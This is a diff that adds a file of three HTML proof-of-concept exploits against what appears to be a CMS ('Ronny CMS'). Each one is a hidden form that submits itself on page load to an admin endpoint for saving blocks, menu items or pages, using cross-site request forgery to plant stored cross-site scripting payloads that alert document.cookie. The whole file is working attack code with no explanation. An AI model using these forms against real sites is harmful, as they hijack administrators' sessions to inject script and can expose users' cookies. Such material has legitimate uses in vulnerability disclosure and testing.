@@ -1,0 +1,62 @@
+&lt;form action=&quot;http://www.example.com/system/admin.php&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;bside&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bshow_template&quot; value=&quot;standard&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bcmodule[]&quot; value=&quot;-1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bcmodule[]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bcmodule[]&quot; value=&quot;2&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bcmodule[]&quot; value=&quot;3&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bvisible&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bweight&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;btitle&quot; value='1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bcontent&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;bctype&quot; value=&quot;H&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;fct&quot; value=&quot;blocksadmin&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;op&quot; value=&quot;save&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+
+
+&lt;form action=&quot;http://www.example.com/menu/admin/index.php?op=saveItem&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;menuid&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;2&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value='Pages&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;/pages/&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;order&quot; value=&quot;20&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+
+
+&lt;form action=&quot;http://www.example.com/pages/admin/index.php?op=editPage1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pname&quot; value=&quot;Page name&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;purl&quot; value=&quot;main&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ptemplate&quot; value=&quot;index&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;porder&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ptext&quot; value=&quot;Ronny CMS page text&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pfile&quot;; filename=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pdesc&quot; value='page description&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pkeywords&quot; value=&quot;page metas&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ptags&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;update_pid&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot; name=&quot;submit&quot; value=&quot;SAVE&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('btn').click();
+&lt;/script&gt;
